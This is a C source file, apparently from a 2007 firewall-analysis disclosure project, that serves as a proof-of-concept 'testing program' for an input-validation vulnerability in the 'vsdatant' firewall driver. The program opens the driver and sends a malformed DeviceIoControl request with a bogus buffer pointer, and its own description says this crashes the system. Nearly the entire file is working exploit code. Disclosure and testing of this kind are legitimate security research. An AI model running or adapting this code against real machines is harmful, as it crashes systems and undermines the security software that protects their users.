/*

 Testing program for Testing program for Insufficient validation of 'vsdatant' driver input buffer Vulnerability (BTP00003P000ZA)
 

 Usage:
 prog
   (the program is executed without special arguments)

 Description:
 This program uses standard Windows API CreateFile to open "vsdatant" driver and using DeviceIoControl it sends 
 malicious buffer to the driver that crashs the system.

 Test:
 Running the testing program.

*/

#include <stdio.h>
#include <windows.h>

void about(void)
{
  printf("Testing program for Testing program for Insufficient validation of \"vsdatant\" driver input buffer Vulnerability (BTP00003P000ZA)\n");
  printf("Windows Personal Firewall analysis project\n");
  printf("Copyright 2007 by Matousec - Transparent security\n");
  printf("http://www.matousec.com/""\n\n");
  return;
}

void usage(void)
{
  printf("Usage: test\n"
         "  (the program is executed without special arguments)\n");
  return;
}


int main(int argc,char **argv)
{
  about();

  if (argc!=1)
  {
    usage();
    return 1;
  }

  HANDLE file=CreateFile("\\\\.\\Global\\vsdatant",GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE,
                         NULL,OPEN_EXISTING,0,NULL);
  if (file!=INVALID_HANDLE_VALUE)
  {
    DWORD retlen;
    DeviceIoControl(file,0x8400002B,(PVOID)1,0x20,0,0,&retlen,NULL);
  }

  printf("\nTEST FAILED!\n");
  return 1;
}
                                  
